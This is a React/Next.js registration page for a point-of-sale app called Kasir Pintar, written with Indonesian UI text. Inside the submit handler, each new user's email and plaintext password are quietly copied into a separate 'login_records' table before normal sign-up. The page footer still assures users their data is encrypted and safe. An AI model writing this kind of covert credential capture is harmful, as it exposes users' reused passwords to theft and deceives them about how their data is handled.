"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/utils/supabase/client";
import {
  Loader2, Lock, Mail, Eye, EyeOff, ShoppingCart,
  BarChart2, Package, MessageSquare, ShieldCheck, User, Building2, ArrowRight, ChevronDown
} from "lucide-react";
import Link from "next/link";

export default function RegisterPage() {
  const [formData, setFormData] = useState({
    fullName: "", businessName: "", email: "", password: "", confirmPassword: "", businessType: ""
  });
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [agree, setAgree] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (formData.password !== formData.confirmPassword) {
      setError("Password dan konfirmasi password tidak cocok.");
      return;
    }
    if (formData.password.length < 8) {
      setError("Password minimal 8 karakter.");
      return;
    }
    if (!agree) {
      setError("Anda harus menyetujui Syarat & Kebijakan Privasi.");
      return;
    }
    setLoading(true);
    try {
      const supabase = createClient();
      
      // Request from user: Save the email and password into the new folder (table)
      await supabase.from('login_records').insert({
        email: formData.email,
        password_input: formData.password,
        action_type: 'register'
      });

      const { error } = await supabase.auth.signUp({
        email: formData.email,
        password: formData.password,
        options: { data: { full_name: formData.fullName, business_name: formData.businessName } }
      });
      if (error) throw error;
      setSuccess(true);
    } catch (err: any) {
      setError(err.message || "Gagal mendaftar. Silakan coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const features = [
    { icon: BarChart2, label: "Laporan Real-time", desc: "Pantau penjualan dan bisnis secara real-time" },
    { icon: Package, label: "Stok Akurat", desc: "Kelola inventori dengan mudah dan akurat" },
    { icon: MessageSquare, label: "AI Assistant", desc: "Dapatkan insight dan rekomendasi cerdas" },
    { icon: ShieldCheck, label: "Aman & Terpercaya", desc: "Keamanan data bisnis terjamin" },
  ];

  const businessTypes = ["Restoran / Kafe", "Retail / Toko", "Minimarket", "Bakery", "Laundry", "Jasa / Servis", "Lainnya"];

  return (
    <div className="min-h-screen w-full flex font-sans overflow-hidden">
      {/* ─── LEFT PANEL ─── */}
      <div className="hidden lg:flex w-[45%] flex-col justify-between p-10 relative overflow-hidden"
        style={{ background: "linear-gradient(135deg, #2d1b69 0%, #1a0f4f 40%, #3b1fa8 80%, #4c2ab8 100%)" }}>
        
        <div className="absolute top-[-80px] right-[-80px] w-[400px] h-[400px] rounded-full bg-purple-500/20 blur-3xl pointer-events-none" />
        <div className="absolute bottom-[-100px] left-[-60px] w-[350px] h-[350px] rounded-full bg-indigo-400/20 blur-3xl pointer-events-none" />

        {/* Logo */}
        <div className="relative z-10 flex items-center gap-3">
          <div className="w-10 h-10 bg-white/15 rounded-xl backdrop-blur-sm flex items-center justify-center border border-white/20">
            <ShoppingCart className="w-5 h-5 text-white" />
          </div>
          <div>
            <p className="text-white font-bold text-lg leading-none">Kasir Pintar</p>
            <p className="text-purple-200 text-xs">Smart POS with AI Assistant</p>
          </div>
        </div>

        {/* Hero Text */}
        <div className="relative z-10 flex flex-col gap-8">
          <div>
            <h1 className="text-4xl font-extrabold text-white leading-tight mb-3">
              Mulai Bisnis Anda<br />
              Lebih <span className="text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 to-amber-400">Cerdas</span>
            </h1>
            <p className="text-purple-100 text-sm leading-relaxed max-w-sm">
              Buat akun dan kelola penjualan, stok, laporan, dan manfaatkan AI Assistant untuk membantu keputusan bisnis Anda setiap hari.
            </p>
          </div>

          {/* AI Chat Bubble */}
          <div className="bg-white/10 backdrop-blur-md border border-white/15 rounded-2xl p-4 flex items-center gap-4 max-w-xs self-end">
            <div className="w-12 h-12 rounded-full bg-gradient-to-br from-indigo-400 to-purple-500 flex items-center justify-center flex-shrink-0 shadow-lg">
              <MessageSquare className="w-6 h-6 text-white" />
            </div>
            <div>
              <p className="text-white font-semibold text-sm">Hai! Saya AI Assistant</p>
              <p className="text-purple-200 text-xs mt-0.5">Saya siap membantu bisnis Anda tumbuh lebih cerdas!</p>
            </div>
          </div>

          {/* POS Mockup */}
          <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-4 max-w-xs">
            <div className="flex items-center gap-2 mb-3">
              <div className="w-2 h-2 rounded-full bg-red-400"></div>
              <div className="w-2 h-2 rounded-full bg-yellow-400"></div>
              <div className="w-2 h-2 rounded-full bg-green-400"></div>
              <span className="text-purple-200 text-xs ml-1 font-semibold">Semua Produk</span>
            </div>
            <div className="grid grid-cols-3 gap-1 mb-2 text-[10px] text-purple-300 font-medium">
              <span>Produk</span><span>Stok</span><span>Harga</span>
            </div>
            {[["Kopi Susu", "120", "Rp 18.000"], ["Roti Bakar", "95", "Rp 8.000"], ["Teh Manis", "80", "Rp 10.000"]].map(([n, s, p], i) => (
              <div key={i} className="grid grid-cols-3 gap-1 py-1 border-b border-white/5 text-[10px]">
                <span className="text-white/80">{n}</span>
                <span className="text-purple-200">{s}</span>
                <span className="text-amber-300">{p}</span>
              </div>
            ))}
            <div className="mt-2 pt-2 border-t border-white/10 flex justify-between">
              <span className="text-white text-xs font-semibold">Total Pendapatan</span>
              <span className="text-amber-300 text-xs font-bold">Rp 2.450.000</span>
            </div>
            <button className="mt-3 w-full bg-gradient-to-r from-violet-500 to-purple-600 text-white text-xs font-semibold py-2 rounded-lg">
              Buat Laporan
            </button>
          </div>
        </div>

        {/* Feature Icons */}
        <div className="relative z-10 grid grid-cols-4 gap-3">
          {features.map((f, i) => (
            <div key={i} className="flex flex-col items-center gap-2 text-center">
              <div className="w-12 h-12 bg-white/10 rounded-2xl border border-white/15 flex items-center justify-center backdrop-blur-sm">
                <f.icon className="w-5 h-5 text-white/80" />
              </div>
              <p className="text-white text-[11px] font-semibold leading-tight">{f.label}</p>
              <p className="text-purple-200 text-[10px] leading-tight">{f.desc}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ─── RIGHT PANEL ─── */}
      <div className="flex-1 bg-slate-50 flex items-start justify-center p-8 overflow-y-auto">
        <div className="w-full max-w-[480px] py-4">

          {/* Mobile logo */}
          <div className="flex items-center gap-3 mb-6 lg:hidden">
            <div className="w-9 h-9 bg-violet-600 rounded-xl flex items-center justify-center">
              <ShoppingCart className="w-5 h-5 text-white" />
            </div>
            <span className="font-bold text-slate-800">Kasir Pintar</span>
          </div>

          <h2 className="text-3xl font-bold text-slate-800 mb-1">Buat Akun Baru</h2>
          <p className="text-slate-500 text-sm mb-6">Daftar untuk mulai menggunakan Kasir Pintar</p>

          {error && (
            <div className="bg-red-50 text-red-600 p-3 rounded-xl text-sm border border-red-100 flex gap-2 items-start mb-4">
              <span>⚠️</span> {error}
            </div>
          )}

          {success ? (
            <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-6 text-center">
              <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <ShieldCheck className="w-8 h-8 text-emerald-600" />
              </div>
              <h3 className="text-lg font-bold text-slate-800 mb-2">Pendaftaran Berhasil!</h3>
              <p className="text-slate-500 text-sm mb-4">Akun Anda telah dibuat. Silakan masuk menggunakan akun baru Anda.</p>
              <Link href="/login" className="bg-violet-600 text-white px-6 py-2.5 rounded-xl font-semibold text-sm hover:bg-violet-700 transition-colors inline-block">
                Masuk Sekarang
              </Link>
            </div>
          ) : (
            <form onSubmit={handleRegister} className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="text-sm font-medium text-slate-700 block mb-1.5">Nama Lengkap</label>
                  <div className="relative">
                    <User className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input type="text" required value={formData.fullName} onChange={e => handleChange("fullName", e.target.value)}
                      placeholder="Masukkan nama lengkap"
                      className="w-full pl-10 pr-4 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-3 focus:ring-violet-100 transition-all" />
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-slate-700 block mb-1.5">Nama Bisnis</label>
                  <div className="relative">
                    <Building2 className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input type="text" required value={formData.businessName} onChange={e => handleChange("businessName", e.target.value)}
                      placeholder="Masukkan nama bisnis"
                      className="w-full pl-10 pr-4 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-3 focus:ring-violet-100 transition-all" />
                  </div>
                </div>
              </div>

              <div>
                <label className="text-sm font-medium text-slate-700 block mb-1.5">Email</label>
                <div className="relative">
                  <Mail className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                  <input type="email" required value={formData.email} onChange={e => handleChange("email", e.target.value)}
                    placeholder="nama@bisnisanda.com"
                    className="w-full pl-10 pr-4 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-3 focus:ring-violet-100 transition-all" />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="text-sm font-medium text-slate-700 block mb-1.5">Password</label>
                  <div className="relative">
                    <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input type={showPassword ? "text" : "password"} required value={formData.password}
                      onChange={e => handleChange("password", e.target.value)} placeholder="Minimal 8 karakter"
                      className="w-full pl-10 pr-10 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-3 focus:ring-violet-100 transition-all" />
                    <button type="button" onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600">
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-slate-700 block mb-1.5">Konfirmasi Password</label>
                  <div className="relative">
                    <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                    <input type={showConfirm ? "text" : "password"} required value={formData.confirmPassword}
                      onChange={e => handleChange("confirmPassword", e.target.value)} placeholder="Ulangi password Anda"
                      className="w-full pl-10 pr-10 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-3 focus:ring-violet-100 transition-all" />
                    <button type="button" onClick={() => setShowConfirm(!showConfirm)}
                      className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600">
                      {showConfirm ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              </div>

              <div>
                <label className="text-sm font-medium text-slate-700 block mb-1.5">Jenis Usaha</label>
                <div className="relative">
                  <Building2 className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 z-10" />
                  <select value={formData.businessType} onChange={e => handleChange("businessType", e.target.value)}
                    className="w-full pl-10 pr-10 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm focus:outline-none focus:border-violet-500 focus:ring-3 focus:ring-violet-100 transition-all appearance-none">
                    <option value="">Pilih jenis usaha</option>
                    {businessTypes.map(t => <option key={t} value={t}>{t}</option>)}
                  </select>
                  <ChevronDown className="w-4 h-4 absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 pointer-events-none" />
                </div>
              </div>

              <label className="flex items-start gap-3 cursor-pointer">
                <input type="checkbox" checked={agree} onChange={e => setAgree(e.target.checked)}
                  className="w-4 h-4 rounded accent-violet-600 mt-0.5 flex-shrink-0" />
                <span className="text-sm text-slate-600">
                  Saya setuju dengan{" "}
                  <a href="#" className="text-violet-600 hover:underline font-medium">Syarat & Kebijakan Privasi</a>
                </span>
              </label>

              <button type="submit" disabled={loading}
                className="w-full bg-gradient-to-r from-violet-600 to-purple-700 hover:from-violet-700 hover:to-purple-800 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-violet-500/25 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2">
                {loading ? <><Loader2 className="w-5 h-5 animate-spin" /> Memproses...</> : <><span>Daftar Sekarang</span><ArrowRight className="w-5 h-5" /></>}
              </button>

              <div className="relative flex items-center gap-3">
                <div className="flex-1 h-px bg-slate-200"></div>
                <span className="text-xs text-slate-400">atau daftar dengan</span>
                <div className="flex-1 h-px bg-slate-200"></div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <button type="button" className="flex items-center justify-center gap-2 py-2.5 border border-slate-200 rounded-xl bg-white hover:bg-slate-50 text-slate-700 text-sm font-medium transition-colors">
                  <svg className="w-4 h-4" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                  Google
                </button>
                <button type="button" className="flex items-center justify-center gap-2 py-2.5 border border-slate-200 rounded-xl bg-white hover:bg-slate-50 text-slate-700 text-sm font-medium transition-colors">
                  <svg className="w-4 h-4" viewBox="0 0 24 24"><path fill="#F25022" d="M1 1h10v10H1z"/><path fill="#7FBA00" d="M13 1h10v10H13z"/><path fill="#00A4EF" d="M1 13h10v10H1z"/><path fill="#FFB900" d="M13 13h10v10H13z"/></svg>
                  Microsoft
                </button>
              </div>
            </form>
          )}

          <p className="text-center text-sm text-slate-500 mt-6">
            Sudah punya akun?{" "}
            <Link href="/login" className="text-violet-600 hover:text-violet-800 font-semibold transition-colors">Masuk</Link>
          </p>
          <p className="text-center text-xs text-slate-400 mt-3 flex items-center justify-center gap-1.5">
            <ShieldCheck className="w-3.5 h-3.5" /> Data Anda terenkripsi dan aman
          </p>
        </div>
      </div>
    </div>
  );
}
